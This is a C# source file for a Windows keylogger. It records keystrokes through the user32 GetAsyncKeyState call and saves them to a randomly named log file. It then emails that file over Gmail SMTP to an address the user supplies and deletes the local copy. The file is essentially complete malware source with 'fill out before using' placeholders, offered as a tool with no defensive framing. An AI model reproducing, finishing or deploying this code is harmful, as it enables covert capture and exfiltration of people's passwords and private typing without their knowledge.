using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;

namespace logger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {

            SendEmail();

        }

        // generate name of file and return the value
        protected static String GetNameOfFile()
        {
            Random rand = new Random();

            String options = "abceefghijklmnopqrstuvABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+=-";
            String nameOfFile ="";

            int numOfChars = 10;

            for (int i = numOfChars; i > 0; i--)
            {
                nameOfFile += options[rand.Next(options.Length - 1)];
            }

            nameOfFile += "_log.txt";

            Console.Write(nameOfFile);

            return nameOfFile;
        }

        // create file

        protected static String CreateFile(String log) 
        {
            String fileApp = GetNameOfFile();
            String path = /*location you would like for the log file to be*/ + fileApp;

            try
            {
                using (StreamWriter sw = new StreamWriter(path, true))
                {
                    sw.Write("Log:\n\n");
                    sw.Write(log); ;
                    sw.Close();
                }
                
            }
            catch
            {
                //Console.WriteLine("nope");
            }
            //Environment.Exit(0);
            //

            return path;

        } 

        protected static String captureStrokes()
        {

            String Strokes = "";
            int counter = 0;

           
            while (true)
            {
                
                Thread.Sleep(75);

                for(int i = 32; i < 128; i++)
                {
                    int KeyState = GetAsyncKeyState(i);
                    
                    if(KeyState == 32769)
                    {
                        if (i == 10) {
                            Strokes += "\n";
                        }
                        //Console.Write((Char)i + ",");
                        Strokes += (Char)i;
                    }                                                         
                }
                
                counter++;

                if(counter == 300)
                {
                    break;
                }
            }

            //Console.WriteLine("");
            //Console.WriteLine("in strokes method\n" + Strokes);
            return Strokes;
        }

        // send the email
        // FILL OUT BEFORE USING
        protected static void SendEmail()
        {
            //Console.WriteLine("who is this goin to");
            String to = /*the email adress you want the log sent to*/;
            
            String subject = "Log File";

            
            // FILL OUT BEFORE USING
            using (SmtpClient client = new SmtpClient("smtp.gmail.com", 587))
            {
                String file = CreateFile(captureStrokes());

                client.EnableSsl = true;
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.UseDefaultCredentials = false;
                client.Credentials = new NetworkCredential(/*email adress credentails*/, /*password credentials*/);


                MailMessage msgObj = new MailMessage();
                msgObj.To.Add(to);
                msgObj.From = new MailAddress(/*the email adress you would like it to be from*/);
                msgObj.Subject = subject;
                //msgObj.Body = body;
                msgObj.Attachments.Add(new Attachment(file));

                client.Send(msgObj);
                try
                {
                    File.Delete(file);
                }
                catch
                {
                    Console.Write(" not deleted ");
                }
            }
        }


    }

}


